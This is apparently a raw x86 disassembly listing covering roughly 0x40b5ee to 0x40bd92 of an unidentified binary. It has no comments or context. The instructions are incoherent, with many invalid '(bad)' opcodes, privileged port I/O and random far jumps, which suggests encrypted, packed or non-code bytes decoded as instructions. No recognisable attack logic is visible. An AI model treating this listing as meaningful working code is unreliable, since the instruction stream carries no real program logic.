  40b5ee:	cdq    
  40b5ef:	sub    eax,0x69d1fe60
  40b5f4:	sub    eax,0x17389ef0
  40b5f9:	repnz out dx,al
  40b5fb:	mov    ds:0xbf1613bb,al
  40b600:	add    eax,0x6087906a
  40b605:	dec    edi
  40b606:	xor    BYTE PTR [eax],ch
  40b608:	retf   0x90f7
  40b60b:	ja     0x40b68c
  40b60d:	std    
  40b60e:	iret   
  40b60f:	retf   
  40b610:	cmp    ecx,esp
  40b612:	cld    
  40b613:	or     DWORD PTR [eax],0xe0fa612
  40b619:	out    dx,eax
  40b61a:	mov    ebx,0xc8f0831f
  40b61f:	cwde   
  40b620:	imul   ebx,DWORD PTR [eax],0x8b72b217
  40b626:	push   0xf0f1c345
  40b62b:	sub    eax,0x19f95e4b
  40b630:	stos   DWORD PTR es:[edi],eax
  40b631:	icebp  
  40b632:	retf   0x3078
  40b635:	pop    ss
  40b636:	ret    
  40b637:	mov    dl,BYTE PTR ds:0xae06c5d
  40b63d:	mov    bh,0xbc
  40b63f:	dec    edi
  40b640:	js     0x40b5f0
  40b642:	xchg   dh,ah
  40b644:	mov    eax,ds:0x8a41e83
  40b649:	cmp    edx,esi
  40b64b:	xor    ah,BYTE PTR [edi+0x8233f34]
  40b651:	add    al,0xb1
  40b653:	or     al,0x8d
  40b655:	and    ecx,DWORD PTR [ebx+ebx*8]
  40b658:	xchg   esp,eax
  40b659:	inc    DWORD PTR [edx]
  40b65b:	repz sub BYTE PTR [ebx],dl
  40b65e:	xchg   ecx,eax
  40b65f:	xor    dl,BYTE PTR ds:0x7f7ff997
  40b665:	xchg   esp,eax
  40b666:	jle    0x40b691
  40b668:	xchg   ebx,eax
  40b669:	fcmovb st,st(1)
  40b66b:	inc    edx
  40b66c:	xchg   esi,eax
  40b66d:	mov    dl,0x86
  40b66f:	pop    edx
  40b671:	adc    al,0x95
  40b673:	xor    eax,0x29a622df
  40b678:	xchg   edi,eax
  40b679:	sbb    edx,edi
  40b67b:	jmp    0x6248:0x8d7b6609
  40b682:	xchg   edi,eax
  40b683:	and    al,BYTE PTR [edx-0x12]
  40b686:	cs cld 
  40b688:	mov    esi,0xb5fec549
  40b68d:	sbb    eax,0x1408c987
  40b692:	in     eax,0x61
  40b694:	mov    eax,0x3bd555dd
  40b699:	icebp  
  40b69a:	sub    BYTE PTR [edi+0x4a],0xf8
  40b69e:	punpckhdq mm7,QWORD PTR [edx+0x83e7261]
  40b6a5:	cmp    BYTE PTR [edi+0x9],0x2f
  40b6a9:	push   edx
  40b6aa:	mov    al,BYTE PTR [esi+0xc]
  40b6ad:	in     eax,dx
  40b6ae:	cwde   
  40b6af:	xor    DWORD PTR [edx+edi*4+0x789a150b],ebp
  40b6b6:	mov    dh,0x1c
  40b6b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6b9:	xchg   ebx,eax
  40b6ba:	xchg   DWORD PTR [edi-0x3917319],ebp
  40b6c0:	fdivrp st(0),st
  40b6c2:	out    dx,al
  40b6c3:	dec    eax
  40b6c4:	(bad)  
  40b6c5:	out    dx,eax
  40b6c6:	pop    es
  40b6c7:	inc    edi
  40b6c8:	mov    dh,0xc6
  40b6ca:	or     ch,BYTE PTR [ecx+ecx*2]
  40b6cd:	icebp  
  40b6ce:	push   ss
  40b6cf:	jno    0x40b708
  40b6d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6d3:	fbld   TBYTE PTR [ebp-0x6fbeeb12]
  40b6d9:	fld    QWORD PTR [edx]
  40b6db:	fmul   DWORD PTR [ebp-0x60f6ff8b]
  40b6e1:	test   al,0x47
  40b6e3:	cwde   
  40b6e4:	test   eax,0x229f8618
  40b6e9:	dec    esp
  40b6ea:	mov    ecx,0x22440dd5
  40b6ef:	ss jae 0x40b6e3
  40b6f2:	adc    eax,0xa14e799a
  40b6f7:	adc    ecx,DWORD PTR [edi]
  40b6f9:	push   esp
  40b6fa:	dec    esp
  40b6fb:	cmp    BYTE PTR [ecx],0x5e
  40b6fe:	mov    al,0xe7
  40b700:	in     eax,dx
  40b701:	add    DWORD PTR [edi],esi
  40b703:	into   
  40b704:	cdq    
  40b705:	repnz dec esi
  40b707:	sti    
  40b708:	out    dx,eax
  40b709:	in     al,0x18
  40b70b:	sar    BYTE PTR [esi+0x894e750],0xa2
  40b712:	push   ecx
  40b713:	hlt    
  40b714:	mov    ah,0xcf
  40b716:	push   ds
  40b717:	inc    esi
  40b718:	call   0xeb73:0x405e0ec9
  40b71f:	sbb    DWORD PTR [edi-0x36],edi
  40b722:	jecxz  0x40b779
  40b724:	sub    esp,ecx
  40b726:	mov    edi,0x86660ba9
  40b72b:	out    dx,eax
  40b72c:	adc    DWORD PTR [edx+0x189d7c36],esi
  40b732:	(bad)  
  40b733:	aam    0x4b
  40b735:	xchg   esp,eax
  40b736:	movaps XMMWORD PTR [esi+eax*8+0x480867d7],xmm0
  40b73e:	sub    cl,bl
  40b740:	retf   
  40b741:	xchg   ecx,eax
  40b742:	jb     0x40b6d1
  40b744:	adc    eax,0xf5bb66f0
  40b749:	stos   DWORD PTR es:[edi],eax
  40b74a:	call   0xfb1bf2dd
  40b74f:	xchg   BYTE PTR [esi+0x656387ef],cl
  40b755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b756:	and    esp,DWORD PTR [ecx+0x2852cf25]
  40b75c:	and    eax,DWORD PTR [ecx-0x36]
  40b75f:	fincstp 
  40b761:	lds    esi,FWORD PTR [ebx]
  40b763:	dec    ecx
  40b764:	leave  
  40b765:	out    dx,al
  40b766:	mov    WORD PTR ds:0xd4b4f158,ss
  40b76c:	nop
  40b76d:	pusha  
  40b76e:	sti    
  40b76f:	jb     0x40b7c9
  40b771:	cwde   
  40b772:	mov    dh,0xb2
  40b774:	mov    edi,0x2f978721
  40b779:	mov    edi,0xeefb8a94
  40b77e:	jp     0x40b7a9
  40b780:	fstp   QWORD PTR [edi+edx*2]
  40b783:	dec    ebx
  40b784:	fdivr  QWORD PTR [edi-0x5a]
  40b787:	push   edx
  40b788:	out    dx,eax
  40b789:	and    al,BYTE PTR [esi-0x3103e279]
  40b78f:	jne    0x40b796
  40b791:	icebp  
  40b792:	xchg   edx,eax
  40b793:	(bad)  
  40b795:	es mov bh,0xe7
  40b798:	pop    edi
  40b799:	aaa    
  40b79a:	fbstp  TBYTE PTR [eax-0x46780ee1]
  40b7a0:	out    0xca,al
  40b7a2:	mov    bl,0x94
  40b7a4:	inc    edi
  40b7a5:	xor    al,0xca
  40b7a7:	sub    DWORD PTR [ebx+0x39],ecx
  40b7aa:	jae    0x40b796
  40b7ac:	or     BYTE PTR [edx-0x34],dl
  40b7af:	leave  
  40b7b0:	mov    ecx,0xede2825b
  40b7b5:	(bad)  
  40b7b6:	fmul   DWORD PTR [ecx+0x533b9a5]
  40b7bc:	or     ch,BYTE PTR [edx]
  40b7be:	fimul  WORD PTR [ebx+0x61]
  40b7c1:	imul   edi,DWORD PTR [esi],0x807b09a1
  40b7c7:	rcr    DWORD PTR [edx],1
  40b7c9:	and    DWORD PTR ds:0x6ef07702,0xaf5f6a44
  40b7d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7d4:	outs   dx,BYTE PTR ds:[esi]
  40b7d5:	lea    ebx,[ebp+0x36f60edb]
  40b7db:	addr16 mov edi,0x56079e75
  40b7e1:	leave  
  40b7e2:	sub    al,0x6a
  40b7e4:	jge    0x40b7d6
  40b7e6:	ss cmp al,0x4d
  40b7e9:	add    al,0xa
  40b7eb:	mov    cl,0xe1
  40b7ed:	aaa    
  40b7ee:	ja     0x40b816
  40b7f0:	push   cs
  40b7f1:	fild   DWORD PTR [edi-0x4c83a2d3]
  40b7f7:	inc    edi
  40b7f8:	inc    ebp
  40b7f9:	(bad)  [eax+0x29]
  40b7fc:	mov    al,ds:0x8ec7580
  40b801:	or     BYTE PTR [edx-0x2f],0x7d
  40b805:	jns    0x40b7d2
  40b807:	fwait
  40b808:	or     eax,ecx
  40b80a:	jno    0x40b7e2
  40b80c:	sbb    al,dh
  40b80e:	out    0x48,al
  40b810:	xor    BYTE PTR [edi+0x52],cl
  40b813:	shl    DWORD PTR [ecx-0x18],0x20
  40b817:	mov    ch,0xb1
  40b819:	repnz test BYTE PTR [ebx-0x70],ah
  40b81d:	cld    
  40b81e:	(bad)  
  40b820:	mov    ebp,0xe26bc6f1
  40b825:	addr16 jle 0x40b879
  40b828:	dec    ecx
  40b829:	pop    ds
  40b82a:	inc    ecx
  40b82b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b82c:	inc    esp
  40b82d:	clc    
  40b82e:	xchg   ebx,eax
  40b830:	outs   dx,BYTE PTR ds:[esi]
  40b831:	retf   
  40b832:	test   BYTE PTR [ebp+0x49f8df26],0x80
  40b839:	lock cli 
  40b83b:	push   ebx
  40b83c:	repz loope 0x40b8a9
  40b83f:	imul   ecx,DWORD PTR [esi],0x680659c2
  40b845:	out    0x3c,eax
  40b847:	mov    WORD PTR [edx],fs
  40b849:	pop    ss
  40b84a:	fwait
  40b84b:	pop    edi
  40b84c:	mov    BYTE PTR [ecx-0x994e673],ch
  40b852:	test   DWORD PTR [eax],edx
  40b854:	ins    BYTE PTR es:[edi],dx
  40b855:	(bad)  
  40b856:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b857:	sub    BYTE PTR [esp+eiz*2+0xf],bh
  40b85b:	dec    ecx
  40b85c:	adc    dl,bl
  40b85e:	xchg   ch,bl
  40b860:	dec    esi
  40b861:	adc    dl,BYTE PTR [edx+0x60bc8553]
  40b867:	adc    ah,BYTE PTR [ecx+0x28]
  40b86a:	stc    
  40b86b:	sub    BYTE PTR [ebp+0x2],ch
  40b86e:	sbb    DWORD PTR [ebx+0x5a],ecx
  40b871:	or     BYTE PTR [edi+0x2d3ef83b],al
  40b877:	into   
  40b878:	add    eax,0x9729301a
  40b87d:	push   esp
  40b87e:	sbb    BYTE PTR ds:0xe395b609,0x78
  40b885:	mov    ch,0x7
  40b887:	inc    edx
  40b888:	xchg   esi,eax
  40b889:	lock mov BYTE PTR [edx+eax*4-0x64],dl
  40b88e:	jo     0x40b878
  40b890:	(bad)  [esi]
  40b892:	xchg   edx,eax
  40b893:	aad    0xf8
  40b895:	retf   
  40b896:	mov    ebp,0x5d83df1
  40b89b:	gs enter 0x79a0,0x1f
  40b8a0:	lods   eax,DWORD PTR ds:[esi]
  40b8a1:	mov    esp,0x18f128a5
  40b8a6:	xchg   ebx,eax
  40b8a7:	cmp    esi,edi
  40b8a9:	jno    0x40b8f3
  40b8ab:	inc    esp
  40b8ac:	es inc esi
  40b8ae:	leave  
  40b8af:	out    dx,eax
  40b8b0:	(bad)  
  40b8b1:	icebp  
  40b8b2:	in     al,0x5f
  40b8b4:	add    edx,ebx
  40b8b6:	(bad)  
  40b8b7:	mov    dh,0xac
  40b8b9:	ficomp WORD PTR [ecx-0x7b7b0daf]
  40b8bf:	adc    eax,DWORD PTR [edi-0x67]
  40b8c2:	pusha  
  40b8c3:	leave  
  40b8c4:	and    al,0xf1
  40b8c6:	dec    esi
  40b8c7:	push   ss
  40b8c8:	jmp    0xd9e126a5
  40b8cd:	cmc    
  40b8ce:	xor    esi,DWORD PTR [edi]
  40b8d0:	in     eax,0xe3
  40b8d2:	xchg   BYTE PTR [ebx-0x732f9f6b],bl
  40b8d8:	fucomi st,st(0)
  40b8da:	sbb    al,0x28
  40b8dc:	ss pop edx
  40b8de:	xlat   BYTE PTR ds:[ebx]
  40b8df:	jb     0x40b8f8
  40b8e1:	loopne 0x40b883
  40b8e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8e4:	ja     0x40b916
  40b8e6:	sub    ch,al
  40b8e8:	scas   al,BYTE PTR es:[edi]
  40b8e9:	xchg   esi,eax
  40b8ea:	scas   eax,DWORD PTR es:[edi]
  40b8eb:	lock inc ebp
  40b8ed:	je     0x40b8e6
  40b8ef:	sub    edi,eax
  40b8f1:	call   0x9a1:0x68165ebf
  40b8f8:	mov    esi,0xb2a244b1
  40b8fd:	mov    bh,BYTE PTR [ebp+0x21261584]
  40b903:	sub    DWORD PTR ds:0x8837558,ebx
  40b909:	mov    cs,WORD PTR [edi+0x68b03a23]
  40b90f:	nop
  40b910:	pop    ds
  40b911:	icebp  
  40b912:	or     cl,BYTE PTR [ebp-0x3ed2422d]
  40b918:	cld    
  40b919:	jne    0x40b8aa
  40b91b:	ins    BYTE PTR es:[edi],dx
  40b91c:	push   edi
  40b91d:	or     al,0x87
  40b91f:	and    DWORD PTR gs:[edi],edi
  40b922:	inc    ebx
  40b923:	xchg   esi,eax
  40b924:	xor    eax,0xc0b3c108
  40b92a:	mov    edi,DWORD PTR ds:0xd04d8d42
  40b930:	mul    DWORD PTR [ebx+0x77dc0d62]
  40b936:	fmul   QWORD PTR [ebp+0x57]
  40b939:	imul   DWORD PTR [eax]
  40b93b:	jmp    0x5c266f7e
  40b940:	imul   ecx,ecx,0xdee5b638
  40b946:	lods   al,BYTE PTR ds:[esi]
  40b947:	shr    BYTE PTR [edx+0x69],cl
  40b94a:	xchg   BYTE PTR [ecx],al
  40b94c:	dec    ebp
  40b94d:	mov    ch,0x94
  40b94f:	mov    ch,0x7f
  40b951:	outs   dx,DWORD PTR ds:[esi]
  40b952:	push   esp
  40b953:	sub    BYTE PTR [ebp+eiz*1-0x71f79efa],ch
  40b95a:	mov    ah,0x7d
  40b95c:	(bad)  
  40b95d:	call   0x89a4:0xf14b6927
  40b964:	call   0xffe2:0x9e7e022a
  40b96b:	cmp    DWORD PTR [edx],ebp
  40b96d:	sbb    DWORD PTR [edi+0x36ddc2cf],eax
  40b973:	sbb    al,0xc5
  40b975:	jl     0x40b97a
  40b977:	das    
  40b978:	inc    edi
  40b979:	call   DWORD PTR [ebx]
  40b97b:	mov    ah,dh
  40b97d:	sbb    BYTE PTR ds:0x823f7b4,al
  40b983:	push   ss
  40b984:	js     0x40b98b
  40b986:	add    al,0x3f
  40b988:	mov    al,0xf1
  40b98a:	mov    ds:0x6fb105d8,al
  40b98f:	xchg   ebp,eax
  40b990:	adc    BYTE PTR [ecx+0x6a],dh
  40b993:	popa   
  40b994:	or     DWORD PTR [edx-0x386ef949],edi
  40b99a:	mov    ecx,0x8b8fba
  40b99f:	or     edx,ebp
  40b9a1:	and    DWORD PTR [edi-0x23df2cd7],edi
  40b9a7:	fdivr  st(7),st
  40b9a9:	loope  0x40b9f6
  40b9ab:	cmp    eax,0x96c332e9
  40b9b0:	fisttp QWORD PTR ds:0x8cdb6182
  40b9b6:	retf   0x4029
  40b9b9:	stos   DWORD PTR es:[edi],eax
  40b9ba:	mov    ?,WORD PTR [ecx]
  40b9bc:	or     DWORD PTR [edx+0x4f],ebp
  40b9bf:	enter  0x9046,0x90
  40b9c3:	aas    
  40b9c4:	mov    cl,0xf0
  40b9c6:	jb     0x40ba0f
  40b9c8:	ins    DWORD PTR es:[edi],dx
  40b9c9:	sub    dl,BYTE PTR [ebp-0x7d]
  40b9cc:	lahf   
  40b9cd:	mov    esp,0x2c57b7a4
  40b9d2:	xchg   DWORD PTR [ebp-0x513622d0],esi
  40b9d8:	mov    ecx,0x492943a7
  40b9dd:	xor    dl,BYTE PTR ds:0xdf02e210
  40b9e3:	arpl   WORD PTR [ebp-0x764267b5],dx
  40b9e9:	mov    fs,ebp
  40b9eb:	xchg   esp,eax
  40b9ec:	adc    ebp,ebx
  40b9ee:	or     esi,DWORD PTR [ebp+0x3b]
  40b9f1:	shl    DWORD PTR [ebp-0x71ad35cb],cl
  40b9f7:	inc    eax
  40b9f8:	xor    BYTE PTR [ecx],dl
  40b9fa:	push   ebx
  40b9fb:	sbb    eax,esi
  40b9fd:	jns    0x40b9e6
  40b9ff:	jnp    0x40ba74
  40ba01:	scas   al,BYTE PTR es:[edi]
  40ba02:	bound  eax,QWORD PTR [ebx]
  40ba04:	push   edi
  40ba05:	daa    
  40ba06:	shr    DWORD PTR [eax],1
  40ba08:	(bad)  
  40ba09:	adc    esp,DWORD PTR [ebx]
  40ba0b:	and    al,BYTE PTR [edi-0x59d6761d]
  40ba11:	add    eax,0x580e6976
  40ba16:	sbb    eax,0x5cdc9e4
  40ba1b:	jg     0x40ba2f
  40ba1d:	jns    0x40ba85
  40ba1f:	dec    ecx
  40ba20:	and    eax,0x4e285d78
  40ba25:	clc    
  40ba26:	inc    esp
  40ba27:	ror    DWORD PTR [ecx],0x94
  40ba2a:	(bad)
  40ba2d:	jno    0x40ba6a
  40ba2f:	test   DWORD PTR [ebx-0x52b9c30f],0xde9c0885
  40ba39:	and    al,0xc8
  40ba3b:	sbb    al,0x79
  40ba3d:	push   ds
  40ba3e:	xor    BYTE PTR [edi-0x61fb001b],0xf1
  40ba45:	cmp    BYTE PTR [esi-0x354351f],bl
  40ba4b:	push   0xd64c9a16
  40ba50:	inc    eax
  40ba51:	lock jecxz 0x40ba33
  40ba54:	aam    0x17
  40ba56:	loop   0x40ba18
  40ba58:	dec    edi
  40ba59:	mov    edi,0xb6d72921
  40ba5e:	xchg   DWORD PTR [ecx+ecx*1+0x66],eax
  40ba62:	test   al,0xdd
  40ba64:	xlat   BYTE PTR ds:[ebx]
  40ba65:	repz sbb al,0x46
  40ba68:	(bad)  
  40ba69:	lock clc 
  40ba6b:	sbb    al,0xaf
  40ba6d:	sub    edx,edi
  40ba6f:	adc    eax,0xfd741c2c
  40ba74:	mov    ebx,0xcc1b870a
  40ba79:	mov    ds:0xf0bf8569,eax
  40ba7e:	hlt    
  40ba7f:	in     eax,0x79
  40ba81:	mov    dh,dh
  40ba83:	mov    eax,0x2b73e539
  40ba88:	dec    ebx
  40ba89:	mov    esp,0xa44db386
  40ba8e:	popf   
  40ba8f:	xchg   ebp,eax
  40ba90:	xchg   ebp,eax
  40ba91:	arpl   WORD PTR [eax+0xb920937],di
  40ba97:	mov    BYTE PTR [esi-0x786798d2],cl
  40ba9d:	clc    
  40ba9e:	xchg   BYTE PTR [edi+0xa],ch
  40baa1:	jmp    0x2f56:0x92214d68
  40baa8:	add    eax,0x23af5866
  40baad:	aas    
  40baae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baaf:	retw   
  40bab1:	pusha  
  40bab2:	mov    esi,0x77c10bb
  40bab7:	mov    ecx,DWORD PTR [edi-0x10]
  40baba:	push   esp
  40babb:	add    cl,cl
  40babd:	pop    esp
  40babe:	les    edi,FWORD PTR [esi-0xc0d44b1]
  40bac4:	or     BYTE PTR [eax-0xe6f0586],dh
  40baca:	mov    ebx,0xe48ca23c
  40bacf:	dec    ebp
  40bad0:	aaa    
  40bad1:	rol    bh,cl
  40bad3:	lods   al,BYTE PTR ds:[esi]
  40bad4:	or     DWORD PTR [esi+0x234bd35d],ebx
  40bada:	xchg   esp,eax
  40badb:	fimul  DWORD PTR [eax]
  40badd:	sub    al,0x3b
  40badf:	inc    eax
  40bae0:	out    dx,eax
  40bae1:	sbb    al,0x43
  40bae3:	rcl    bh,cl
  40bae5:	cmc    
  40bae6:	cmp    BYTE PTR [eax+0x28aedc14],ah
  40baec:	mov    BYTE PTR [eax],bh
  40baee:	jnp    0x40bad6
  40baf0:	fdiv   st,st(7)
  40baf2:	test   al,0xf8
  40baf4:	scas   eax,DWORD PTR es:[edi]
  40baf5:	fwait
  40baf6:	xchg   DWORD PTR [ecx+0x1b66c144],ebp
  40bafc:	test   DWORD PTR [esi+0x7e76365e],ebp
  40bb02:	bnd call 0x8bc96bff
  40bb08:	bound  ecx,QWORD PTR [edx]
  40bb0a:	ss add eax,0xa5800d1f
  40bb10:	mov    bh,0x50
  40bb12:	outs   dx,DWORD PTR ds:[esi]
  40bb13:	inc    ebp
  40bb14:	nop
  40bb15:	in     al,dx
  40bb16:	pop    eax
  40bb17:	repnz out 0xa6,eax
  40bb1a:	adc    eax,0x4639cc2c
  40bb1f:	out    0xf7,eax
  40bb21:	jae    0x40baea
  40bb23:	push   ss
  40bb24:	fs pop edi
  40bb26:	fst    QWORD PTR [esi-0x4c730eda]
  40bb2c:	aad    0xd
  40bb2e:	fdiv   DWORD PTR [ebx+0x62734543]
  40bb34:	in     al,dx
  40bb35:	dec    ebp
  40bb36:	mov    edi,0x930d043
  40bb3b:	lods   eax,DWORD PTR ds:[esi]
  40bb3c:	ficom  DWORD PTR [eax]
  40bb3e:	mov    eax,ds:0x2051dc19
  40bb43:	cld    
  40bb44:	(bad)
  40bb47:	mov    ch,0x55
  40bb49:	jns    0x40bad0
  40bb4b:	mov    edx,0x61b5a48e
  40bb50:	aas    
  40bb51:	add    BYTE PTR [edi+0x575e725b],al
  40bb57:	inc    ebp
  40bb58:	(bad)  
  40bb59:	icebp  
  40bb5a:	mov    DWORD PTR [ebx],ebp
  40bb5c:	mov    bh,0xc9
  40bb5e:	lea    ebx,[edi-0x3eb3c67d]
  40bb64:	xor    al,0x55
  40bb66:	xchg   DWORD PTR [ebx+0x4d3f0b87],esi
  40bb6c:	or     esi,ebp
  40bb6e:	int    0x29
  40bb70:	scas   al,BYTE PTR es:[edi]
  40bb71:	jo     0x40bb98
  40bb73:	xchg   esp,eax
  40bb74:	neg    DWORD PTR [edi-0x1a]
  40bb77:	cmp    cl,BYTE PTR [esi+ecx*4-0xe9cb987]
  40bb7e:	inc    eax
  40bb7f:	jp     0x40bb30
  40bb81:	add    DWORD PTR ds:[edx],esi
  40bb84:	pop    edi
  40bb85:	lods   eax,DWORD PTR ds:[esi]
  40bb86:	mov    ds:0x867b5c20,eax
  40bb8b:	adc    eax,0x130e2904
  40bb90:	xor    al,0x71
  40bb92:	out    dx,eax
  40bb93:	push   0x3b
  40bb95:	sbb    DWORD PTR [edi-0x29],esp
  40bb98:	dec    ebx
  40bb99:	pusha  
  40bb9a:	ja     0x40bc11
  40bb9c:	xor    edi,DWORD PTR [esi-0x8]
  40bb9f:	sub    BYTE PTR [eax-0x3c],bh
  40bba2:	mov    dl,bl
  40bba4:	loop   0x40bbc8
  40bba6:	xchg   BYTE PTR [ecx],al
  40bba8:	xor    eax,0xedde6fc9
  40bbad:	mov    ecx,0xff9228c3
  40bbb2:	sahf   
  40bbb3:	pop    edi
  40bbb4:	out    0x8a,eax
  40bbb6:	cmp    dl,BYTE PTR ds:0xd5873254
  40bbbc:	out    dx,al
  40bbbd:	loopne 0x40bbe3
  40bbbf:	fwait
  40bbc0:	mov    ebx,DWORD PTR [edi-0x7b00d703]
  40bbc6:	outs   dx,BYTE PTR ds:[esi]
  40bbc7:	mov    ebx,0x2043ee08
  40bbcc:	test   cl,bl
  40bbce:	not    BYTE PTR [ecx-0x3c]
  40bbd1:	lock sub BYTE PTR [ebx-0x4083064c],dh
  40bbd8:	dec    eax
  40bbd9:	fs jmp 0x5133:0x87623a16
  40bbe1:	sub    bl,BYTE PTR [ebx]
  40bbe3:	ja     0x40bbfc
  40bbe5:	(bad)  
  40bbe6:	xor    al,0xd9
  40bbe8:	mov    ch,bl
  40bbea:	sahf   
  40bbeb:	in     eax,0x2a
  40bbed:	jmp    0x45b2:0xc013e889
  40bbf4:	out    dx,eax
  40bbf5:	jno    0x40bb86
  40bbf7:	inc    eax
  40bbf8:	popf   
  40bbf9:	xchg   esp,eax
  40bbfa:	rcl    DWORD PTR [esi+0x29dfc489],1
  40bc00:	sbb    edx,DWORD PTR ds:0xdc0c55f5
  40bc06:	scas   eax,DWORD PTR es:[edi]
  40bc07:	and    ebp,DWORD PTR ds:0x1a382660
  40bc0d:	inc    ecx
  40bc0e:	or     al,0xea
  40bc10:	pop    esi
  40bc11:	lock push esi
  40bc13:	repnz push ds
  40bc15:	rol    bl,1
  40bc17:	pop    esp
  40bc18:	stc    
  40bc19:	jb     0x40bc83
  40bc1b:	mov    ecx,DWORD PTR [ebx]
  40bc1d:	dec    edx
  40bc1e:	mov    ebx,0x3d9186f7
  40bc23:	out    dx,eax
  40bc24:	dec    ebp
  40bc25:	lods   eax,DWORD PTR ds:[esi]
  40bc26:	mov    dl,al
  40bc28:	mov    dl,0x5
  40bc2a:	fld    TBYTE PTR [esi]
  40bc2c:	mov    al,ds:0xc56885b4
  40bc31:	or     esp,edi
  40bc33:	sub    BYTE PTR [ecx+0x6b],bl
  40bc36:	pop    esp
  40bc37:	aad    0x8
  40bc39:	test   bl,0x7c
  40bc3c:	push   es
  40bc3d:	lds    ebp,FWORD PTR [edi-0x62]
  40bc40:	(bad)  
  40bc41:	icebp  
  40bc42:	je     0x40bc47
  40bc44:	dec    esp
  40bc45:	xor    edi,DWORD PTR [ebp-0x58287ef3]
  40bc4b:	call   FWORD PTR [edi-0x1cc19940]
  40bc51:	sbb    DWORD PTR [edi+0x11416128],eax
  40bc57:	addr16 and esp,ebx
  40bc5a:	cli    
  40bc5b:	sub    dl,bl
  40bc5d:	jmp    0x40bc0d
  40bc5f:	mov    ebx,0x7b54e60a
  40bc64:	pushf  
  40bc65:	rcl    BYTE PTR [esi],1
  40bc67:	ret    0xbac9
  40bc6a:	jnp    0x40bc1a
  40bc6c:	in     eax,dx
  40bc6d:	or     ecx,edx
  40bc6f:	leave  
  40bc70:	bndstx [edi+0x39243d28],(bad)
  40bc77:	pop    edi
  40bc78:	or     DWORD PTR [eax-0x4b],ecx
  40bc7b:	mov    esp,0x611ac60
  40bc80:	sti    
  40bc81:	lock inc edx
  40bc83:	cmp    ch,BYTE PTR [ebp-0xcf8bd9]
  40bc89:	sahf   
  40bc8a:	dec    esp
  40bc8b:	icebp  
  40bc8c:	or     BYTE PTR [eax+esi*2-0x59],cl
  40bc90:	aaa    
  40bc91:	aas    
  40bc92:	sub    BYTE PTR [ebx-0x7c0301d4],bh
  40bc98:	stos   DWORD PTR es:[edi],eax
  40bc99:	mov    bh,0xc8
  40bc9b:	xor    al,0x3d
  40bc9d:	stos   BYTE PTR es:[edi],al
  40bc9e:	push   ebp
  40bc9f:	mov    DWORD PTR [ecx],ecx
  40bca1:	rcr    BYTE PTR [ebx],cl
  40bca3:	cwde   
  40bca4:	jo     0x40bc97
  40bca6:	cdq    
  40bca7:	jbe    0x40bc7f
  40bca9:	(bad)  
  40bcaa:	pop    esp
  40bcab:	push   ss
  40bcac:	cld    
  40bcad:	pushf  
  40bcae:	mov    ds:0xcbfaaa80,al
  40bcb3:	(bad)  
  40bcb4:	jbe    0x40bcc4
  40bcb6:	xchg   DWORD PTR [ebp+0x3b8fd7b2],edx
  40bcbc:	mov    eax,ds:0x27c7d791
  40bcc1:	ret    
  40bcc2:	and    DWORD PTR ds:0x119a902b,0x73f8fa99
  40bccc:	ret    0xa0dc
  40bccf:	push   esp
  40bcd0:	loopne 0x40bc98
  40bcd2:	xchg   BYTE PTR [eax+0x5],bh
  40bcd5:	jne    0x40bc73
  40bcd7:	push   es
  40bcd8:	xchg   edi,eax
  40bcd9:	cli    
  40bcda:	ret    0xa129
  40bcdd:	adc    al,0x7f
  40bcdf:	dec    eax
  40bce0:	jo     0x40bcd6
  40bce2:	xchg   ecx,edx
  40bce4:	and    eax,0x3147165c
  40bce9:	push   edx
  40bcea:	add    BYTE PTR [eax+0x7b],bl
  40bced:	pushf  
  40bcee:	xchg   BYTE PTR ds:0x90718cfb,al
  40bcf4:	or     eax,edx
  40bcf6:	fs std 
  40bcf8:	sbb    edx,eax
  40bcfa:	mov    ds:0xbcdfd06b,eax
  40bcff:	es jge 0x40bd53
  40bd02:	enter  0x2c29,0xa7
  40bd06:	ja     0x40bcca
  40bd08:	or     edx,ebp
  40bd0a:	mov    esp,DWORD PTR [ebp-0x7a]
  40bd0d:	jecxz  0x40bd6f
  40bd0f:	sar    al,cl
  40bd11:	(bad)  
  40bd12:	xor    dh,BYTE PTR [ebp-0xf]
  40bd15:	daa    
  40bd16:	shr    BYTE PTR [eax],0x84
  40bd19:	add    eax,0x4633b066
  40bd1e:	xor    al,0x2e
  40bd20:	mov    dl,dl
  40bd22:	pushf  
  40bd23:	push   es
  40bd24:	sub    esi,0x6
  40bd27:	and    ebx,DWORD PTR [eax+esi*8]
  40bd2a:	cwde   
  40bd2b:	pop    eax
  40bd2c:	and    DWORD PTR ds:0x3cfb3d40,ecx
  40bd32:	mov    al,ds:0x87849538
  40bd37:	mov    eax,ds:0xff622856
  40bd3c:	pop    edi
  40bd3d:	fist   DWORD PTR [eax-0x1b6608cc]
  40bd43:	jb     0x40bd35
  40bd45:	xlat   BYTE PTR ds:[ebx]
  40bd46:	cmp    DWORD PTR [ebp+0x4b],edx
  40bd49:	stc    
  40bd4a:	xchg   BYTE PTR [ecx],bl
  40bd4c:	sbb    DWORD PTR [ecx],eax
  40bd4e:	xchg   DWORD PTR [edi+ebx*1],ebx
  40bd51:	jp     0x40bdbd
  40bd53:	push   edx
  40bd54:	or     eax,0xc71676b9
  40bd59:	pop    ebp
  40bd5a:	fisubr WORD PTR [ebx]
  40bd5c:	mov    ds:0x20f5aa70,al
  40bd61:	dec    edx
  40bd62:	(bad)  [ebx*2+0xed8797]
  40bd69:	add    al,0x5b
  40bd6b:	add    bh,BYTE PTR [edi]
  40bd6d:	in     al,0xba
  40bd6f:	int3   
  40bd70:	sbb    BYTE PTR [ebp+0x25],dh
  40bd73:	xor    DWORD PTR [ecx+0x20285f0a],esp
  40bd79:	inc    eax
  40bd7a:	jecxz  0x40bd22
  40bd7c:	pop    eax
  40bd7d:	or     al,BYTE PTR [esi-0x16361cf9]
  40bd83:	push   eax
  40bd84:	(bad)  
  40bd85:	push   cs
  40bd86:	div    DWORD PTR [eax+ecx*4]
  40bd89:	sub    al,0x17
  40bd8b:	and    DWORD PTR [eax+0x3d],0x49
  40bd8f:	(bad)  
  40bd90:	jae    0x40bd8b
  40bd92:	fisubr WORD PTR [edi+0x2bf54088]
